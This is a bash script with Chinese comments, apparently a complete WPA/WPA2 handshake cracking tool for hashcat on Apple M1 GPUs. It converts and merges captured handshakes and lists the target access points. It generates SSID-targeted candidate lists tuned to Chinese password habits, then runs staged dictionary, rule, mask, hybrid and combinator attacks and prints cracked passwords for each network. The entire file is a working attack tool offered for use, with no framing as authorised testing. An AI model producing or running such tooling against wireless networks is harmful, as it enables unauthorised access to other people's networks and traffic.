#!/bin/bash
# ============================================================================
# Mac 本地 WiFi 握手包 GPU 破解脚本 v6.0 (强密码增强版)
# hashcat v7.1.2 + Apple M1 Metal/OpenCL GPU
# 中国WiFi密码专用优化 (基于公安部第三研究所密码研究)
# 新增: hybrid混合攻击 / combinator组合攻击 / multi-rule堆叠 / 随机规则
# 注意: WPA密码必须 8-63 位, 所有候选均强制过滤
# ============================================================================

# ── 所有路径基于脚本所在目录，支持任意位置运行 ──
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
HASH_DIR="${SCRIPT_DIR}/hashes"
DICT_DIR="${SCRIPT_DIR}/dicts"
WORK_DIR="${SCRIPT_DIR}/work"

mkdir -p "${WORK_DIR}"

# ── 自动搜索本地定制字典 ──
CN_CUSTOM=""
for _p in "${DICT_DIR}/cn_wifi_dict.txt" \
          "${SCRIPT_DIR}/../wifi-crack-kali/cn_wifi_dict.txt" \
          "${SCRIPT_DIR}/cn_wifi_dict.txt"; do
    [ -f "$_p" ] && CN_CUSTOM="$_p" && break
done

echo "============================================"
echo "  WiFi 中国密码专用破解 v6.0 (强密码增强)"
echo "  hashcat + Apple M1 Metal GPU"
echo "============================================"

# ── 检查 hashcat ──
HASHCAT=$(which hashcat)
if [ -z "$HASHCAT" ]; then
    echo "[!] hashcat 未安装: brew install hashcat"
    exit 1
fi
echo "hashcat: $(${HASHCAT} --version)"
${HASHCAT} -I 2>/dev/null | grep -E "Name|Type" | head -4
echo ""

# ============================================================================
# 第一步: 扫描所有 hash 文件，合并去重
# ============================================================================
echo "── 扫描握手包 ──"
MERGED="${WORK_DIR}/all_merged.22000"
> "${MERGED}"

# 扫描 hashes/ 和 captures/ 两个目录
for SCAN_DIR in "${HASH_DIR}" "${SCRIPT_DIR}/captures"; do
    [ -d "${SCAN_DIR}" ] || continue
    find "${SCAN_DIR}" \( -name "*.22000" -o -name "*.hc22000" \) -print0 | while IFS= read -r -d '' f; do
        echo "  + $(basename "$f")"
        grep "^WPA\*" "$f" >> "${MERGED}" 2>/dev/null
    done
    if command -v hcxpcapngtool &>/dev/null; then
        find "${SCAN_DIR}" \( -name "*.cap" -o -name "*.pcap" -o -name "*.pcapng" \) -print0 | while IFS= read -r -d '' f; do
            echo "  + 转换 $(basename "$f")"
            TMP="${WORK_DIR}/tmp_cap.22000"
            hcxpcapngtool --all -o "${TMP}" "$f" 2>/dev/null
            [ -f "${TMP}" ] && grep "^WPA\*" "${TMP}" >> "${MERGED}" 2>/dev/null && rm -f "${TMP}"
        done
    fi
done

HASHES="${WORK_DIR}/hashes_deduped.22000"
sort -u "${MERGED}" > "${HASHES}"
TOTAL_LINES=$(wc -l < "${HASHES}" | tr -d ' ')
[ "$TOTAL_LINES" -eq 0 ] && echo "[!] 未发现有效hashline" && exit 1

echo ""
echo "── 目标 AP ──"
awk -F'*' '{print $4"|"$6}' "${HASHES}" | sort -u | while IFS='|' read bssid ssid_hex; do
    ssid=$(echo "$ssid_hex" | xxd -r -p 2>/dev/null || echo "$ssid_hex")
    mac=$(echo "$bssid" | sed 's/\(..\)/\1:/g; s/:$//')
    cnt=$(grep -c "$bssid" "${HASHES}")
    echo "  ${ssid} (${mac}) x${cnt}"
done
AP_COUNT=$(awk -F'*' '{print $4}' "${HASHES}" | sort -u | wc -l | tr -d ' ')
echo "合计: ${AP_COUNT} 个AP, ${TOTAL_LINES} 条hashline"
echo ""

# ============================================================================
# 第二步: 基于SSID生成针对性字典 (中国特色)
# ============================================================================
echo "── 基于WiFi名生成定向字典 ──"
SSID_DICT="${WORK_DIR}/ssid_targeted.txt"
> "${SSID_DICT}"

awk -F'*' '{print $6}' "${HASHES}" | sort -u | while read -r ssid_hex; do
    ssid=$(echo "$ssid_hex" | xxd -r -p 2>/dev/null || echo "$ssid_hex")
    [ ${#ssid} -lt 2 ] && continue
    lo=$(echo "$ssid" | tr '[:upper:]' '[:lower:]')
    no_sep=$(echo "$lo" | tr -d '_- ')
    # SSID 本身及变体
    for s in "$ssid" "$lo" "$no_sep"; do
        echo "${s}"
        # 基础数字后缀
        for sfx in 123 1234 12345 123456 1234567 12345678 123456789 1234567890 \
                   888 8888 88888 888888 88888888 \
                   666 6666 66666 666666 66666666 \
                   520 520520 1314 5201314 168 168168 \
                   000 0000 000000 00000000 999 9999 99999999 \
                   111 1111 11111111 \
                   2020 2021 2022 2023 2024 2025 2026; do
            echo "${s}${sfx}"
        done
        # 特殊字符后缀 (强密码)
        for sfx in '!' '@' '#' '@123' '#123' '!123' '!@#' '@#$' \
                   '123!' '1234!' '123456!' '12345678!' \
                   '!@#$' '!@#$%' '520!' '1314!' '888!' '666!'; do
            echo "${s}${sfx}"
        done
        # "."号后缀 (CERNET研究: "."是中国WiFi最常用特殊字符!)
        for sfx in '.' '..' '.1' '.com' '1.' '123.' '888.' '520.'; do
            echo "${s}${sfx}"
        done
        # "@"号后缀 (CERNET: 第二常用特殊字符)
        for sfx in '@' '@1' '@123' '@1234' '123@' '888@' '520@'; do
            echo "${s}${sfx}"
        done
        # 弱口令后缀 (曹操WiFi研究: 无规律但高频)
        for sfx in 'qwerasdf' 'aabbcc' 'abcabc' 'abcdef' '121314' '5201314' \
                   'asdqwe' '1q2w3e4r' 'zxcvbn' 'asdasd' 'qweqwe'; do
            echo "${s}${sfx}"
        done
        # 词语拼音后缀 (曹操WiFi: niubi/woai/aini等高频词)
        for sfx in 'niubi' 'nb666' 'woai' 'aini' 'woaini' 'nihao' \
                   'dashen' 'wangba' 'laoban' 'jiayou' 'haode'; do
            echo "${s}${sfx}"
        done
        # 两位年份简写后缀 (CERNET: 非常普遍)
        for yr in 78 79 80 81 82 83 84 85 86 87 88 89 \
                  90 91 92 93 94 95 96 97 98 99 \
                  00 01 02 03 04 05 06; do
            echo "${s}${yr}"
        done
        # 常见前缀组合
        echo "wifi${s}"; echo "admin${s}"; echo "${s}wifi"
        echo "my${s}"; echo "i${s}"; echo "the${s}"
        echo "${s}love"; echo "${s}happy"; echo "${s}good"
        echo "love${s}"; echo "iloveu${s}"; echo "woai${s}"
        # 首字母大写变体
        cap="$(echo "${s:0:1}" | tr '[:lower:]' '[:upper:]')${s:1}"
        [ "$cap" != "$s" ] && {
            echo "${cap}"
            for sfx in 123 1234 123456 12345678 '!' '@' '123!' '!@#'; do
                echo "${cap}${sfx}"
            done
        }
    done
    # leet speak 变体 (强密码用户常用)
    for s in "$lo" "$no_sep"; do
        leet=$(echo "$s" | sed 's/a/@/g; s/e/3/g; s/i/1/g; s/o/0/g; s/s/$/g')
        [ "$leet" != "$s" ] && {
            echo "${leet}"
            for sfx in 123 1234 123456 '!' '123!' '!@#'; do
                echo "${leet}${sfx}"
            done
        }
        leet2=$(echo "$s" | sed 's/a/4/g; s/e/3/g; s/i/!/g; s/o/0/g; s/s/5/g')
        [ "$leet2" != "$s" ] && [ "$leet2" != "$leet" ] && {
            echo "${leet2}"
            for sfx in 123 '!' '123!'; do
                echo "${leet2}${sfx}"
            done
        }
    done
    # 年份+特殊字符组合 (强密码: ssid2025!)
    for s in "$lo" "$no_sep"; do
        for yr in 2024 2025 2026 1988 1990 1995 1998 2000; do
            echo "${s}${yr}!"
            echo "${s}${yr}@"
            echo "${s}${yr}#"
        done
    done
    # 反转变体
    rev=$(echo "$lo" | rev 2>/dev/null)
    [ -n "$rev" ] && [ "$rev" != "$lo" ] && {
        echo "${rev}"
        for sfx in 123 1234 123456 '!' '123!'; do
            echo "${rev}${sfx}"
        done
    }
    # 双词拼接 (ssid+常见词 / 常见词+ssid)
    for s in "$lo" "$no_sep"; do
        for word in wifi pass password admin love happy lucky good forever; do
            echo "${s}${word}"
            echo "${word}${s}"
        done
    done
    # 路由器型号特征（Xiaomi/TP-LINK/Huawei 等）
    brand=$(echo "$lo" | grep -oiE 'xiaomi|tplink|tp-link|huawei|mercury|tenda|fast|zte|cmcc|chinanet')
    [ -n "$brand" ] && {
        for sfx in 12345678 1234567890 88888888 00000000 admin123 \
                  password wifi1234 123456789 admin888 \
                  'admin!' 'password!' '12345678!' 'admin@123'; do
            echo "${sfx}"
        done
    }
    # 后缀提取（如 A380 → a380xxxx 组合）
    suffix=$(echo "$ssid" | grep -oE '[a-zA-Z0-9]{3,6}$')
    [ -n "$suffix" ] && {
        slo=$(echo "$suffix" | tr '[:upper:]' '[:lower:]')
        for sfx in "" 1234 12345 123456 12345678 8888 6666 0000 \
                   2024 2025 2026 '!' '123!' '!@#' '2025!' '2026!'; do
            echo "${slo}${sfx}"; echo "${suffix}${sfx}"
            echo "${sfx}${slo}"
        done
        echo "${slo}${slo}"; echo "${suffix}${suffix}"
    }
done | awk 'length>=8 && length<=63' | sort -u > "${SSID_DICT}"
echo "  SSID定向字典: $(wc -l < "${SSID_DICT}" | tr -d ' ') 条"

# ============================================================================
# 第三步: 统计字典
# ============================================================================
echo ""
echo "── 字典清单 ──"
DICT_COUNT=0; DICT_TOTAL=0
for f in "${DICT_DIR}"/*.txt; do
    [ -f "$f" ] || continue
    n=$(wc -l < "$f" | tr -d ' ')
    [ "$n" -lt 100 ] && continue
    DICT_COUNT=$((DICT_COUNT + 1))
    DICT_TOTAL=$((DICT_TOTAL + n))
    printf "  %-40s %10d 条\n" "$(basename "$f")" "$n"
done
[ -n "${CN_CUSTOM}" ] && [ -f "${CN_CUSTOM}" ] && {
    n=$(wc -l < "${CN_CUSTOM}" | tr -d ' ')
    DICT_COUNT=$((DICT_COUNT + 1)); DICT_TOTAL=$((DICT_TOTAL + n))
    printf "  %-40s %10d 条\n" "$(basename "${CN_CUSTOM}")(本地)" "$n"
}
echo "  共 ${DICT_COUNT} 个字典, 约 ${DICT_TOTAL} 条"
echo ""

# ============================================================================
# 第四步: hashcat GPU 多轮递进攻击
# ============================================================================
# 中国WiFi密码特征 (公安部第三研究所研究):
#   35.6% 纯数字(8位为主，生日/QQ号/弱口令)
#   35.9% 字母+数字(姓氏拼音3位+生日8位占31%)
#   最常见: 8位数字 > 姓拼音+生日 > 手机号 > 拼音+数字
# ============================================================================
POTFILE="${WORK_DIR}/hashcat.potfile"
OUTFILE="${WORK_DIR}/cracked.txt"

HC_BASE="${HASHCAT} -m 22000 ${HASHES} --potfile-path ${POTFILE} --outfile ${OUTFILE} --outfile-format 2 -w 3 --status --status-timer 15 --hwmon-temp-abort=95"

# 查找规则文件（自动搜索所有 homebrew/系统路径）
RULE_BEST64=""
for rp in $(find /opt/homebrew /usr/local /usr/share -path '*/hashcat/rules/best64.rule' 2>/dev/null) \
          "${DICT_DIR}/best64.rule"; do
    [ -f "$rp" ] && RULE_BEST64="$rp" && break
done
RULE_CHINA="${DICT_DIR}/china-wifi.rule"
MASK_CHINA="${DICT_DIR}/00-china-wifi-masks.hcmask"

# 查找 OneRuleToRuleThemAll / dive.rule 等高级规则
RULE_ONERULE=""
for rp in $(find /opt/homebrew /usr/local /usr/share -path '*/hashcat/rules/OneRuleToRuleThemAll.rule' 2>/dev/null) \
          $(find /opt/homebrew /usr/local /usr/share -path '*/hashcat/rules/dive.rule' 2>/dev/null) \
          "${DICT_DIR}/OneRuleToRuleThemAll.rule" \
          "${DICT_DIR}/dive.rule"; do
    [ -f "$rp" ] && RULE_ONERULE="$rp" && break
done

# 查找 toggles 规则 (大小写穷举)
RULE_TOGGLES=""
for rp in $(find /opt/homebrew /usr/local /usr/share -path '*/hashcat/rules/toggles*.rule' 2>/dev/null | head -1) \
          "${DICT_DIR}/toggles5.rule"; do
    [ -f "$rp" ] && RULE_TOGGLES="$rp" && break
done

# ── 已破解统计 ──
show_cracked() {
    [ -f "${POTFILE}" ] || return
    local cnt=$(wc -l < "${POTFILE}" | tr -d ' ')
    [ "$cnt" -eq 0 ] && return
    echo ""
    echo "  ★ 已破解 ${cnt} 条 ★"
    ${HASHCAT} -m 22000 ${HASHES} --potfile-path ${POTFILE} --show 2>/dev/null | while IFS=: read hash pw; do
        ssid_hex=$(echo "$hash" | cut -d'*' -f6)
        ssid=$(echo "$ssid_hex" | xxd -r -p 2>/dev/null || echo "$ssid_hex")
        echo "  -> ${ssid}: ${pw}"
    done
}

# ── 全局破解状态（用 --show 检查当前目标是否已破解, 30秒缓存） ──
ALL_DONE=0
_LAST_CHECK=0
is_done() {
    [ "$ALL_DONE" -eq 1 ] && return 0
    # 30秒缓存: 避免频繁调用 hashcat --show 产生额外开销
    local now=$(date +%s)
    [ $((now - _LAST_CHECK)) -lt 30 ] && return 1
    _LAST_CHECK=$now
    # 用 hashcat --show 只统计当前 hash 文件中已破解的条数
    local cracked=$( ${HASHCAT} -m 22000 "${HASHES}" --potfile-path "${POTFILE}" --show 2>/dev/null | grep -c "^WPA\*" )
    [ "$cracked" -ge "$AP_COUNT" ] && ALL_DONE=1 && echo "  ★★★ 全部 ${AP_COUNT} 个 AP 已破解！跳过剩余攻击 ★★★" && return 0
    return 1
}

# ── 攻击函数（自动检测已全部破解则跳过） ──
ROUND=0
run_dict() {
    local name="$1" dict="$2"
    is_done && return 0
    [ -f "$dict" ] || return 0
    local n=$(wc -l < "$dict" | tr -d ' ')
    [ "$n" -lt 10 ] && return 0
    # 纯字典攻击: 一次性过滤<8位和>63位词条 (WPA密码8-63位)
    local filtered="${WORK_DIR}/filtered_$(basename "$dict")"
    awk 'length>=8 && length<=63' "$dict" > "${filtered}"
    local fn=$(wc -l < "${filtered}" | tr -d ' ')
    [ "$fn" -lt 10 ] && { rm -f "${filtered}"; return 0; }
    if [ "$fn" -lt "$n" ]; then
        local removed=$((n - fn))
        name="${name}(过滤${removed}条短词)"
        n="${fn}"
    fi
    ROUND=$((ROUND + 1))
    echo ""
    echo "────────────────────────────────────────"
    echo "  ${ROUND}. ${name} (${n} 条)"
    echo "────────────────────────────────────────"
    ${HC_BASE} -a 0 "${filtered}" 2>&1
    show_cracked
}

run_dict_rule() {
    local name="$1" dict="$2" rule="$3"
    is_done && return 0
    [ -f "$dict" ] && [ -f "$rule" ] || return 0
    ROUND=$((ROUND + 1))
    local n=$(wc -l < "$dict" | tr -d ' ')
    echo ""
    echo "────────────────────────────────────────"
    echo "  ${ROUND}. ${name} (${n}条 x 规则变换)"
    echo "────────────────────────────────────────"
    ${HC_BASE} -a 0 "$dict" -r "$rule" 2>&1
    show_cracked
}

run_mask() {
    local name="$1"; shift
    is_done && return 0
    ROUND=$((ROUND + 1))
    echo ""
    echo "────────────────────────────────────────"
    echo "  ${ROUND}. ${name}"
    echo "────────────────────────────────────────"
    ${HC_BASE} -a 3 "$@" 2>&1
    show_cracked
}

# ── 计算掩码中固定字符数(用于hybrid预过滤) ──
_mask_len() {
    # 统计掩码产生的字符数: ?X 算1位, 普通字符算1位
    echo "$1" | sed 's/?[ldusahHbB1234]/X/g' | wc -c | tr -d ' '
}

# ── 混合攻击: 字典+掩码 (-a 6) ──
run_hybrid_dm() {
    local name="$1" dict="$2" mask="$3"
    is_done && return 0
    [ -f "$dict" ] || return 0
    # 根据掩码长度计算字典词最小长度 (总长度≥8)
    local mlen=$(_mask_len "$mask")
    mlen=$((mlen - 1))  # wc -c 包含换行符
    local min_word_len=$((8 - mlen))
    [ "$min_word_len" -lt 1 ] && min_word_len=1
    # 过滤字典
    local filtered="${WORK_DIR}/hybrid_$(basename "$dict")"
    awk -v minl="$min_word_len" 'length>=minl && length<=63' "$dict" > "${filtered}"
    local n=$(wc -l < "${filtered}" | tr -d ' ')
    [ "$n" -lt 5 ] && { rm -f "${filtered}"; return 0; }
    ROUND=$((ROUND + 1))
    echo ""
    echo "────────────────────────────────────────"
    echo "  ${ROUND}. ${name} (${n}条 + 掩码${mask})"
    echo "────────────────────────────────────────"
    ${HC_BASE} -a 6 "${filtered}" "$mask" 2>&1
    rm -f "${filtered}"
    show_cracked
}

# ── 混合攻击: 掩码+字典 (-a 7) ──
run_hybrid_md() {
    local name="$1" mask="$2" dict="$3"
    is_done && return 0
    [ -f "$dict" ] || return 0
    # 根据掩码长度计算字典词最小长度 (总长度≥8)
    local mlen=$(_mask_len "$mask")
    mlen=$((mlen - 1))
    local min_word_len=$((8 - mlen))
    [ "$min_word_len" -lt 1 ] && min_word_len=1
    local filtered="${WORK_DIR}/hybrid_md_$(basename "$dict")"
    awk -v minl="$min_word_len" 'length>=minl && length<=63' "$dict" > "${filtered}"
    local n=$(wc -l < "${filtered}" | tr -d ' ')
    [ "$n" -lt 5 ] && { rm -f "${filtered}"; return 0; }
    ROUND=$((ROUND + 1))
    echo ""
    echo "────────────────────────────────────────"
    echo "  ${ROUND}. ${name} (掩码${mask} + ${n}条)"
    echo "────────────────────────────────────────"
    ${HC_BASE} -a 7 "$mask" "${filtered}" 2>&1
    rm -f "${filtered}"
    show_cracked
}

# ── 组合攻击: 两字典拼接 (-a 1) ──
run_combinator() {
    local name="$1" dict1="$2" dict2="$3"
    is_done && return 0
    [ -f "$dict1" ] && [ -f "$dict2" ] || return 0
    ROUND=$((ROUND + 1))
    local n1=$(wc -l < "$dict1" | tr -d ' ')
    local n2=$(wc -l < "$dict2" | tr -d ' ')
    echo ""
    echo "────────────────────────────────────────"
    echo "  ${ROUND}. ${name} (${n1} x ${n2})"
    echo "────────────────────────────────────────"
    ${HC_BASE} -a 1 "$dict1" "$dict2" 2>&1
    show_cracked
}

# ── 多规则堆叠 (-r rule1 -r rule2) ──
run_dict_multi_rule() {
    local name="$1" dict="$2" rule1="$3" rule2="$4"
    is_done && return 0
    [ -f "$dict" ] && [ -f "$rule1" ] && [ -f "$rule2" ] || return 0
    ROUND=$((ROUND + 1))
    local n=$(wc -l < "$dict" | tr -d ' ')
    echo ""
    echo "────────────────────────────────────────"
    echo "  ${ROUND}. ${name} (${n}条 x 双规则堆叠)"
    echo "────────────────────────────────────────"
    ${HC_BASE} -a 0 "$dict" -r "$rule1" -r "$rule2" 2>&1
    show_cracked
}

# ── 随机规则生成攻击 ──
run_random_rules() {
    local name="$1" dict="$2" num_rules="$3" func_min="$4" func_max="$5"
    is_done && return 0
    [ -f "$dict" ] || return 0
    ROUND=$((ROUND + 1))
    local n=$(wc -l < "$dict" | tr -d ' ')
    echo ""
    echo "────────────────────────────────────────"
    echo "  ${ROUND}. ${name} (${n}条 x ${num_rules}随机规则)"
    echo "────────────────────────────────────────"
    ${HC_BASE} -a 0 "$dict" --generate-rules=${num_rules} --generate-rules-func-min=${func_min} --generate-rules-func-max=${func_max} 2>&1
    show_cracked
}

echo "============================================"
echo "  开始攻击 (${AP_COUNT} 个AP)"
echo "============================================"
START_TIME=$(date +%s)

# ──────────────────────────────────────
# 阶段0: SSID定向 + 精华字典 (秒级)
# ──────────────────────────────────────
echo ""
echo ">>>>>> 阶段0: SSID定向 + WiFi精华 <<<<<<"
run_dict "SSID定向字典" "${SSID_DICT}"
run_dict "WiFi WPA Top4800" "${DICT_DIR}/wpa-top4800.txt"
run_dict "00-ssid-target.txt" "${DICT_DIR}/00-ssid-target.txt"

# ──────────────────────────────────────
# 阶段1: 高命中率字典（按概率排序）
# ──────────────────────────────────────
echo ""
echo ">>>>>> 阶段1: 高命中率字典 <<<<<<"
run_dict "wpa-sec真实WiFi密码" "${DICT_DIR}/11-wpa-sec.txt"
run_dict "Probable WPA 20万" "${DICT_DIR}/probable-wpa.txt"
run_dict "中国Top100万" "${DICT_DIR}/cn-top100w.txt"
run_dict "01-top500k" "${DICT_DIR}/01-top500k.txt"

# ──────────────────────────────────────
# 阶段2: 中国专用字典
# ──────────────────────────────────────
echo ""
echo ">>>>>> 阶段2: 中国专用字典 <<<<<<"
run_dict "中国完整410万" "${DICT_DIR}/05-chinese-full-410w.txt"
run_dict "中文姓名" "${DICT_DIR}/02-names-cn.txt"
run_dict "手机号" "${DICT_DIR}/03-phone-numbers.txt"
run_dict "拼音+数字" "${DICT_DIR}/04-pinyin-numbers.txt"
run_dict "姓氏+生日" "${DICT_DIR}/06-surnames-birthdays.txt"
run_dict "生日全格式" "${DICT_DIR}/07-birthdays.txt"
run_dict "拼音姓名" "${DICT_DIR}/08-names-pinyin.txt"
[ -n "${CN_CUSTOM}" ] && [ -f "${CN_CUSTOM}" ] && run_dict "本地定制字典" "${CN_CUSTOM}"

# ──────────────────────────────────────
# 阶段3: 规则变换（小字典 + 中国规则/best64）
# ──────────────────────────────────────
echo ""
echo ">>>>>> 阶段3: 规则变换 <<<<<<"
run_dict_rule "SSID+中国规则" "${SSID_DICT}" "${RULE_CHINA}"
# 对 <50MB 的字典做中国规则变换
for df in "${DICT_DIR}/wpa-top4800.txt" \
          "${DICT_DIR}/11-wpa-sec.txt" \
          "${DICT_DIR}/probable-wpa.txt" \
          "${DICT_DIR}/cn-top100w.txt" \
          "${DICT_DIR}/01-top500k.txt" \
          "${DICT_DIR}/07-birthdays.txt" \
          "${DICT_DIR}/08-names-pinyin.txt" \
          "${DICT_DIR}/06-surnames-birthdays.txt" \
          "${DICT_DIR}/04-pinyin-numbers.txt"; do
    [ -f "$df" ] || continue
    sz=$(stat -f%z "$df" 2>/dev/null || stat -c%s "$df" 2>/dev/null || echo 0)
    [ "$sz" -lt 52428800 ] || continue
    run_dict_rule "$(basename "$df")+中国规则" "$df" "${RULE_CHINA}"
done
# best64 规则 (PMC论文: GPU上应用规则比CPU预处理更高效)
if [ -n "${RULE_BEST64}" ]; then
    run_dict_rule "SSID+best64" "${SSID_DICT}" "${RULE_BEST64}"
    for df in "${DICT_DIR}/wpa-top4800.txt" \
              "${DICT_DIR}/11-wpa-sec.txt" \
              "${DICT_DIR}/probable-wpa.txt" \
              "${DICT_DIR}/01-top500k.txt" \
              "${DICT_DIR}/cn-top100w.txt" \
              "${DICT_DIR}/08-names-pinyin.txt" \
              "${DICT_DIR}/06-surnames-birthdays.txt"; do
        [ -f "$df" ] || continue
        run_dict_rule "$(basename "$df")+best64" "$df" "${RULE_BEST64}"
    done
fi

# ──────────────────────────────────────
# 阶段4: 全球大字典扫荡
# ──────────────────────────────────────
echo ""
echo ">>>>>> 阶段4: 全球大字典 <<<<<<"
run_dict "top2m" "${DICT_DIR}/09-top2m.txt"
run_dict "top5m" "${DICT_DIR}/10-top5m.txt"
run_dict "top20m" "${DICT_DIR}/13-top20m.txt"
run_dict "RockYou 1400万" "${DICT_DIR}/14-rockyou.txt"
run_dict "Pwdb Top100万" "${DICT_DIR}/12-pwdb-top1m.txt"
run_dict "英文字典" "${DICT_DIR}/16-english.txt"
run_dict "10位数字" "${DICT_DIR}/17-10digit-numbers.txt"
# mega160m 超大字典放最后（1.19亿条，耗时较长）
run_dict "mega160m 超大字典" "${DICT_DIR}/15-mega160m.txt"

# ──────────────────────────────────────
# 阶段5: 掩码暴力
# ──────────────────────────────────────
echo ""
echo ">>>>>> 阶段5: 掩码暴力 <<<<<<"
# hcmask 合集文件包含137条掩码 (A-W区, 覆盖所有中国常见模式)
# 所有独立掩码已合并入 hcmask 文件, 避免重复计算
[ -f "${MASK_CHINA}" ] && run_mask "中国WiFi掩码合集(137条)" "${MASK_CHINA}"
# 以下为 hcmask 文件未包含的特殊掩码 (增量/自定义字符集)
run_mask "小写字母增量8-10位" '?l?l?l?l?l?l?l?l?l?l' --increment --increment-min=8
run_mask "小写+数字增量8-10位" -1 '?l?d' '?1?1?1?1?1?1?1?1?1?1' --increment --increment-min=8
run_mask "admin+年份+特殊" -1 '!@#.' 'admin?d?d?d?d?1'
run_mask "wifi+年份+特殊" -1 '!@#.' 'wifi?d?d?d?d?d?1'

# ──────────────────────────────────────
# 阶段6: 混合攻击 Hybrid (字典+掩码/掩码+字典)
# 适合强密码: 已知词根+未知后缀/前缀
# ──────────────────────────────────────
echo ""
echo ">>>>>> 阶段6: 混合攻击 (Hybrid) <<<<<<"
# 字典+数字后缀 (-a 6)
for df in "${DICT_DIR}/wpa-top4800.txt" \
          "${DICT_DIR}/11-wpa-sec.txt" \
          "${DICT_DIR}/probable-wpa.txt" \
          "${DICT_DIR}/08-names-pinyin.txt"; do
    [ -f "$df" ] || continue
    bname=$(basename "$df" .txt)
    run_hybrid_dm "${bname}+2位数字" "$df" '?d?d'
    run_hybrid_dm "${bname}+3位数字" "$df" '?d?d?d'
    run_hybrid_dm "${bname}+4位数字" "$df" '?d?d?d?d'
    run_hybrid_dm "${bname}+5位数字" "$df" '?d?d?d?d?d'
    run_hybrid_dm "${bname}+6位数字" "$df" '?d?d?d?d?d?d'
    run_hybrid_dm "${bname}+1特殊" "$df" '?s'
    run_hybrid_dm "${bname}+数字+特殊" "$df" '?d?s'
    run_hybrid_dm "${bname}+2数字+特殊" "$df" '?d?d?s'
    run_hybrid_dm "${bname}+3数字+特殊" "$df" '?d?d?d?s'
    run_hybrid_dm "${bname}+4数字+特殊" "$df" '?d?d?d?d?s'
    run_hybrid_dm "${bname}+特殊+数字" "$df" '?s?d'
    run_hybrid_dm "${bname}+特殊+2数字" "$df" '?s?d?d'
    run_hybrid_dm "${bname}+特殊+3数字" "$df" '?s?d?d?d'
    # CERNET研究: "."是中国WiFi最常用特殊字符
    run_hybrid_dm "${bname}+点号" "$df" '.'
    run_hybrid_dm "${bname}+数字+点号" "$df" '?d.'
    run_hybrid_dm "${bname}+2数字+点号" "$df" '?d?d.'
    run_hybrid_dm "${bname}+3数字+点号" "$df" '?d?d?d.'
    # CERNET研究: "@"是第二常用特殊字符
    run_hybrid_dm "${bname}+@号" "$df" '@'
    run_hybrid_dm "${bname}+数字+@号" "$df" '?d@'
    run_hybrid_dm "${bname}+2数字+@号" "$df" '?d?d@'
done
# 字典+年份后缀特殊 (-a 6, SSID定向字典)
[ -f "${SSID_DICT}" ] && {
    run_hybrid_dm "SSID+4位数字" "${SSID_DICT}" '?d?d?d?d'
    run_hybrid_dm "SSID+6位数字" "${SSID_DICT}" '?d?d?d?d?d?d'
    run_hybrid_dm "SSID+1特殊" "${SSID_DICT}" '?s'
    run_hybrid_dm "SSID+2数字+特殊" "${SSID_DICT}" '?d?d?s'
    run_hybrid_dm "SSID+4数字+特殊" "${SSID_DICT}" '?d?d?d?d?s'
    run_hybrid_dm "SSID+点号" "${SSID_DICT}" '.'
    run_hybrid_dm "SSID+@号" "${SSID_DICT}" '@'
}
# 姓名拼音字典 + 生日格式后缀 (-a 6, 非常高命中率)
[ -f "${DICT_DIR}/08-names-pinyin.txt" ] && {
    run_hybrid_dm "姓名拼音+8位生日" "${DICT_DIR}/08-names-pinyin.txt" '?d?d?d?d?d?d?d?d'
    run_hybrid_dm "姓名拼音+点号" "${DICT_DIR}/08-names-pinyin.txt" '.'
    run_hybrid_dm "姓名拼音+@号" "${DICT_DIR}/08-names-pinyin.txt" '@'
}
# 数字前缀+字典 (-a 7)
for df in "${DICT_DIR}/wpa-top4800.txt" \
          "${DICT_DIR}/probable-wpa.txt" \
          "${DICT_DIR}/08-names-pinyin.txt"; do
    [ -f "$df" ] || continue
    bname=$(basename "$df" .txt)
    run_hybrid_md "2位数字+${bname}" '?d?d' "$df"
    run_hybrid_md "3位数字+${bname}" '?d?d?d' "$df"
    run_hybrid_md "4位数字+${bname}" '?d?d?d?d' "$df"
    run_hybrid_md "1特殊+${bname}" '?s' "$df"
    run_hybrid_md "特殊+${bname}" '?s?s' "$df"
    # CERNET: 数字前缀+字母也是常见模式
    run_hybrid_md "8位数字+${bname}" '?d?d?d?d?d?d?d?d' "$df"
done

# ──────────────────────────────────────
# 阶段7: 组合攻击 Combinator (双字典拼接)
# 适合: 两个短词拼接成长密码
# ──────────────────────────────────────
echo ""
echo ">>>>>> 阶段7: 组合攻击 (Combinator) <<<<<<"
# 生成短词字典 (从现有字典提取4-6位词)
SHORT_DICT="${WORK_DIR}/short_words.txt"
if [ -f "${DICT_DIR}/wpa-top4800.txt" ]; then
    awk 'length>=4 && length<=6' "${DICT_DIR}/wpa-top4800.txt" > "${SHORT_DICT}" 2>/dev/null
    [ -f "${DICT_DIR}/probable-wpa.txt" ] && \
        awk 'length>=4 && length<=6' "${DICT_DIR}/probable-wpa.txt" >> "${SHORT_DICT}" 2>/dev/null
    sort -u "${SHORT_DICT}" -o "${SHORT_DICT}"
    short_n=$(wc -l < "${SHORT_DICT}" | tr -d ' ')
    if [ "$short_n" -gt 100 ] && [ "$short_n" -lt 50000 ]; then
        run_combinator "短词+短词拼接" "${SHORT_DICT}" "${SHORT_DICT}"
    fi
fi
# SSID定向 + 短词
[ -f "${SSID_DICT}" ] && [ -f "${SHORT_DICT}" ] && \
    run_combinator "SSID词根+短词" "${SSID_DICT}" "${SHORT_DICT}"
# 生成常用数字后缀字典 (CERNET: 数字后缀是最普遍组合)
NUM_SUFFIX="${WORK_DIR}/num_suffix.txt"
{
    # 4位数字高频后缀
    for y in $(seq 1978 2026); do echo "$y"; done
    echo "1234"; echo "5678"; echo "8888"; echo "6666"
    echo "0000"; echo "9999"; echo "1111"; echo "5201"
    echo "1314"; echo "5200"; echo "1688"; echo "6688"
    # 6位生日(YYMMDD)
    for y in 88 90 91 92 93 94 95 96 97 98 99 00 01 02; do
        for m in 01 02 03 04 05 06 07 08 09 10 11 12; do
            echo "${y}${m}01"; echo "${y}${m}15"
        done
    done
    # 8位高频数字
    echo "12345678"; echo "88888888"; echo "66666666"
    echo "00000000"; echo "11111111"; echo "52013140"
} | sort -u > "${NUM_SUFFIX}"
# 姓名拼音短词 + 数字后缀
NAME_SHORT="${WORK_DIR}/name_short.txt"
[ -f "${DICT_DIR}/08-names-pinyin.txt" ] && {
    awk 'length>=2 && length<=6' "${DICT_DIR}/08-names-pinyin.txt" | head -10000 | sort -u > "${NAME_SHORT}"
    name_short_n=$(wc -l < "${NAME_SHORT}" | tr -d ' ')
    [ "$name_short_n" -gt 50 ] && {
        run_combinator "姓名短词+数字后缀" "${NAME_SHORT}" "${NUM_SUFFIX}"
        run_combinator "数字后缀+姓名短词" "${NUM_SUFFIX}" "${NAME_SHORT}"
    }
}
